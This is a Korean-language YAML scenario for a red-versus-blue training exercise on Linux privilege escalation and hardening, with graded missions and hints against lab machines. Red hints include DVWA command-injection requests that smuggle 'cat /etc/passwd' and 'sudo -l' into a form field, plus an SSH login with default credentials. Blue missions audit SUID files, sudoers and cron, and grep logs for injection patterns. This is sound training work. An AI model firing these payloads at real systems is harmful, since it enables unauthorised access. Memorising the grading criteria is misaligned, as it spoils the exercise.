id: "privesc-vs-hardening"
title: "권한 상승 vs 시스템 경화"
description: "침투 테스트 중 일반 사용자 계정이 탈취된 상황을 가정한다. Red Team은 로컬 시스템에서 SUID 바이너리, sudo 설정 미비, cron 작업 등을 악용하여 root 권한을 획득해야 한다. Blue Team은 시스템 감사를 통해 권한 상승 경로를 식별하고 차단하여 시스템을 경화해야 한다."
difficulty: "medium"
time_limit: 2700
battle_type: "1v1"

red_missions:
  - order: 1
    instruction: "대상 시스템(10.20.30.80)에서 SUID 비트가 설정된 파일을 탐색하라."
    hint: "nmap --script ssh-run --script-args 'ssh-run.cmd=find / -perm -4000 -type f 2>/dev/null,ssh-run.username=user,ssh-run.password=user' -p 22 10.20.30.80 --max-retries 1 --host-timeout 15s -T4 2>&1 || echo 'Alternative: curl or direct enumeration required'"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "nmap"
      semantic:
        intent: "MITRE T1548.001 (Setuid and Setgid) — SUID 바이너리 enumerate. GTFOBins 매칭 가능 후보 (vim/find/python/awk/less) 식별. 로컬 PE 표준 1단계."
        success_criteria:
          - "find -perm -4000 -type f 2>/dev/null (정확한 옵션)"
          - "응답에 SUID 바이너리 path 1개 이상"
          - "(보너스) GTFOBins 매칭 가능 binary 식별 (vim/find/python/awk/less/nmap)"
        acceptable_methods:
          - "find / -perm -4000 -type f"
          - "find / -perm -u+s 2>/dev/null"
          - "stat 으로 file 별 검사"
          - "linpeas.sh 또는 LinEnum.sh (자동화)"
        negative_signs:
          - "find 결과 없는데 alternate (locate/tools) 안 시도"
          - "GTFOBins 매핑 안 함 (find 만 + 분석 0)"

  - order: 2
    instruction: "웹 서버(10.20.30.80)의 실행 중인 서비스와 프로세스를 원격으로 열거하라."
    hint: "nmap -sV -p 22,80,3000,8080 10.20.30.80 --max-retries 1 --host-timeout 15s -T4 --script=banner"
    points: 10
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "open"
      semantic:
        intent: "MITRE T1057 (Process Discovery) variant — 외부에서 보이는 service + banner 분석. PE 전 attack surface 식별."
        success_criteria:
          - "nmap -sV + --script=banner"
          - "응답에 open port + banner (Apache version / SSH OpenSSH / Node.js Express)"
          - "특정 service 의 알려진 PE CVE 매핑"
        acceptable_methods:
          - "nmap -sV --script=banner"
          - "nmap -sV --script=http-server-header"
          - "nc <ip> <port> + manual banner 수집"
        negative_signs:
          - "-sV 누락 → version 정보 없음 → CVE 매칭 불가"
          - "단일 port 만 + 다른 service 누락"

  - order: 3
    instruction: "JuiceShop의 환경 정보 노출 취약점을 통해 서버 내부 정보를 수집하라."
    hint: "curl -s http://10.20.30.80:3000/api/Challenges | python3 -m json.tool | head -30"
    points: 15
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "data"
      semantic:
        intent: "JuiceShop /api/Challenges endpoint 등 정보 노출 — Node.js 환경 변수 / 의존 패키지 / 내부 path 노출. Information Disclosure → PE prep."
        success_criteria:
          - "curl /api/Challenges 또는 /api/admin/* 등 정보 leak endpoint"
          - "응답에 environment / version / path 노출"
          - "노출된 정보로 후속 PE 경로 결정"
        acceptable_methods:
          - "curl /api/Challenges"
          - "curl /api/health 또는 /version"
          - "GraphQL introspection (있으면)"
          - "/.env 또는 /config.json 직접 접근"
        negative_signs:
          - "응답 dump 만 + 내부 정보 분석 없음"
          - "endpoint 한 개만 + alternate 안 시도"

  - order: 4
    instruction: "DVWA에서 Command Injection 취약점을 통해 시스템 사용자 목록을 확인하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;cat+/etc/passwd&Submit=Submit'"
    points: 20
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "root"
      semantic:
        intent: "MITRE T1087.001 (Account Discovery: Local Account) — /etc/passwd 의 모든 user enumerate. 후속 PE target user 결정 (root + sudo group)."
        success_criteria:
          - "cat /etc/passwd (cmd inject)"
          - "응답에 root: 시작 + UID 0 식별"
          - "sudo group user 식별 (보너스)"
        acceptable_methods:
          - "cat /etc/passwd"
          - "getent passwd"
          - "awk -F: '$3==0 {print $1}' /etc/passwd (UID 0 추출)"
          - "groups <user> (member 확인)"
        negative_signs:
          - "passwd dump 만 + UID 0 또는 sudo group 분석 없음"

  - order: 5
    instruction: "Command Injection을 통해 sudo 설정을 확인하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;sudo+-l+2>&1&Submit=Submit'"
    points: 20
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "sudo"
      semantic:
        intent: "MITRE T1548.003 (Sudo and Sudo Caching) — sudo -l 로 현재 user 의 NOPASSWD 권한 또는 ALL=(ALL) 식별. NOPASSWD 있으면 즉시 PE."
        success_criteria:
          - "sudo -l 명령 (cmd inject)"
          - "응답에 권한 라인 + NOPASSWD 또는 ALL 식별"
          - "(권한 없으면) Permission denied 또는 Sorry, user X may not run sudo"
        acceptable_methods:
          - "sudo -l"
          - "sudo -l -U <other_user>"
          - "cat /etc/sudoers (root 권한 시)"
          - "ls /etc/sudoers.d/ + cat 각 파일"
        negative_signs:
          - "sudo 명령 안 시도 (sudoers 만 cat)"
          - "권한 부족 시 alternate 안 시도"

  - order: 6
    instruction: "Command Injection을 통해 cron 작업 목록을 확인하라."
    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;ls+-la+/etc/cron*&Submit=Submit'"
    points: 10
    target_vm: attacker
    verify:
      type: "output_contains"
      expect: "cron"
      semantic:
        intent: "MITRE T1053.003 (Cron Job) variant — 시스템 cron 검사. world-writable cron script 또는 /etc/crontab 의 root 실행 항목 식별 → PE."
        success_criteria:
          - "ls -la /etc/cron* + cat /etc/crontab"
          - "응답에 cron file list + permission"
          - "world-writable 또는 root 실행 항목 식별"
        acceptable_methods:
          - "ls -la /etc/cron.d/ /etc/cron.daily/ ..."
          - "cat /etc/crontab"
          - "find /etc/cron* -perm -o+w (world-writable)"
          - "systemctl list-timers (systemd timers 대안)"
        negative_signs:
          - "/etc/cron.d 만 + /var/spool/cron 무시"
          - "permission 분석 없이 ls 만"

blue_missions:
  - order: 1
    instruction: "시스템에서 SUID 비트가 설정된 모든 파일을 감사하라."
    hint: "find / -perm -4000 -type f 2>/dev/null | sort"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "/usr"
      semantic:
        intent: "Red #1 SUID enum 대응 — 정기 audit. baseline (CIS Linux 5.x) 비교 후 비표준 SUID 식별 (CIS 6.1.10/6.1.11)."
        success_criteria:
          - "find / -perm -4000 -type f 2>/dev/null | sort"
          - "baseline (CIS / Distro 표준) 와 diff"
          - "비표준 SUID 1개 이상 식별 (또는 정상 list 보고)"
        acceptable_methods:
          - "find + sort + diff baseline.txt"
          - "lynis audit (자동 항목 SUID-7700)"
          - "AIDE 또는 tripwire baseline"
          - "compliance_scan skill"
        negative_signs:
          - "find 결과 dump 만 + baseline 비교 없음"
          - "정상 SUID (su/sudo/passwd) 까지 의심"

  - order: 2
    instruction: "sudo 설정 파일을 점검하여 위험한 권한 부여가 없는지 확인하라."
    hint: "cat /etc/sudoers && ls -la /etc/sudoers.d/"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "root"
      semantic:
        intent: "Red #5 sudo abuse 차단 — /etc/sudoers + sudoers.d/* 일괄 검사. NOPASSWD / ALL=(ALL) 항목 식별. visudo 로 syntax 검증 권장."
        success_criteria:
          - "cat /etc/sudoers + ls /etc/sudoers.d/ + cat 각 파일"
          - "위험 패턴 (NOPASSWD / ALL=(ALL) NOPASSWD: ALL / 특정 cmd) 식별"
          - "(보너스) Defaults 라인 보안 설정 (requiretty, env_reset)"
        acceptable_methods:
          - "cat + ls"
          - "visudo -c (syntax 검사)"
          - "sudo -ll (모든 user 권한 확인)"
          - "augtool ls /files/etc/sudoers"
        negative_signs:
          - "/etc/sudoers 만 + sudoers.d 무시"
          - "visudo -c 누락 (syntax error 시 sudo 자체 down)"

  - order: 3
    instruction: "cron 작업에서 권한 상승에 악용 가능한 항목이 있는지 점검하라."
    hint: "crontab -l 2>/dev/null; ls -la /etc/cron.d/ /var/spool/cron/crontabs/ 2>/dev/null"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "cron"
      semantic:
        intent: "Red #6 cron PE 차단 — 모든 user crontab + 시스템 cron 검사. world-writable 또는 외부 script 호출 식별."
        success_criteria:
          - "crontab -l + crontab -u <other_users>"
          - "/etc/cron.d/ + /etc/cron.{daily,hourly,weekly}/ + /var/spool/cron/crontabs/"
          - "world-writable 또는 비root user 실행 root cron 식별"
        acceptable_methods:
          - "for u in $(cut -d: -f1 /etc/passwd); do crontab -u $u -l; done"
          - "cat /etc/crontab + ls /etc/cron.*"
          - "find /etc/cron* -perm -o+w"
          - "lynis SHED-7704 자동 점검"
        negative_signs:
          - "현재 user crontab 만 + 다른 user 무시"
          - "permission 검사 누락"

  - order: 4
    instruction: "Apache 접근 로그에서 Command Injection 패턴을 탐지하라."
    hint: "grep -E 'exec|;|%3B|cmd|passwd' /var/log/apache2/access.log | tail -20"
    points: 15
    target_vm: web
    verify:
      type: "output_contains"
      expect: "exec"
      semantic:
        intent: "Red #4-6 의 cmd inject 페이로드 (URL 의 ; / %3B / passwd / sudo / cron) 패턴 탐지. WAF 미적용 시 backup detection."
        success_criteria:
          - "access.log grep -iE 'exec|;|%3B|cmd|passwd|sudo|cron'"
          - "/vulnerabilities/exec/ 호출 + body 의 ;cmd 패턴"
          - "최근 30 line + source IP + URL 추출"
        acceptable_methods:
          - "grep + tail access.log"
          - "awk 분석 (URL 의 ; 또는 %3B 출현 빈도)"
          - "ELK/Loki query"
          - "fail2ban filter"
        negative_signs:
          - "access.log path 잘못 (apache2 vs httpd)"
          - "패턴 매칭 후 source IP 분석 없음"

  - order: 5
    instruction: "현재 실행 중인 프로세스에서 비정상적인 root 프로세스를 확인하라."
    hint: "ps aux --sort=-pcpu | head -20"
    points: 10
    target_vm: web
    verify:
      type: "output_contains"
      expect: "root"
      semantic:
        intent: "MITRE T1057 — UID 0 (root) process 분석. unexpected root process (예: bash from www-data) 식별 = PE 흔적."
        success_criteria:
          - "ps aux + sort by user 또는 pcpu"
          - "USER 컬럼 root + COMMAND 분석"
          - "비정상 (root 권한으로 실행되면 안 되는) process 식별"
        acceptable_methods:
          - "ps aux + grep root"
          - "ps -eo user,pid,cmd | sort | uniq"
          - "auditd execve log"
          - "pspy (실시간 process monitoring)"
        negative_signs:
          - "ps dump 만 + root process 분석 없음"
          - "정상 root process (systemd/sshd) 와 비정상 구분 못함"

  - order: 6
    instruction: "Wazuh에서 권한 상승 관련 알림을 확인하라."
    hint: "grep -i 'privilege\\|escalat\\|sudo' /var/ossec/logs/alerts/alerts.json | tail -20"
    points: 20
    target_vm: siem
    verify:
      type: "output_contains"
      expect: "alert"
      semantic:
        intent: "Wazuh PE 카테고리 룰 (privilege_escalation group) 매칭. SIEM 차원 통합 신호."
        success_criteria:
          - "alerts.json grep -iE 'privilege|escalat|sudo|setuid'"
          - "최소 1개 alert 의 rule.id + group + agent.name"
          - "rule level (10+ critical) 분류"
        acceptable_methods:
          - "grep + tail alerts.json"
          - "jq '.rule.groups[] | contains(\"privilege\")' alerts.json"
          - "Wazuh API: GET /security/agents/<id>/alerts?q=group:privilege_escalation"
          - "Kibana PE dashboard"
        negative_signs:
          - "alerts.json 비어있음 — Wazuh PE 룰 미적용"
          - "raw alert dump 만 + rule.level 분석 없음"
